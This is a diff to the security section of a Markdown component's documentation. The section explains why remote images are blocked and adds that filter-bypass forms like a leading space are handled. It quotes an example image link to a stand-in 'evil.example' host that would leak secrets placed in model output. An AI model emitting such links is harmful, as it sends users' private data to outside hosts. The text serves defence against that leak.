@@ -94,7 +94,7 @@ Other `div` attributes pass to the root. Not supported: reference links, footnot
 
 ## Security
 
-`Markdown` drops raw HTML and unsafe URLs, and images send no referrer. Images on other hosts do not load by default: their alt text renders instead, because `![x](https://evil.example/log?d=<secret>)` in model output would send whatever the model put in that URL to that host, without a click. Relative images load as usual.
+`Markdown` drops raw HTML and unsafe URLs, and images send no referrer. Images on other hosts do not load by default: their alt text renders instead, because `![x](https://evil.example/log?d=<secret>)` in model output would send whatever the model put in that URL to that host, without a click. The check applies to the URL the browser would fetch, so `/\\host` or a leading space does not get past it. Relative images load as usual.
 
 Pass `remoteImages` when the source is trusted. If it renders model output that can see data the reader should not leak, such as other documents or tool results, also limit the hosts with a Content Security Policy. Rivet's default policy covers scripts only and sets no `img-src`.
 
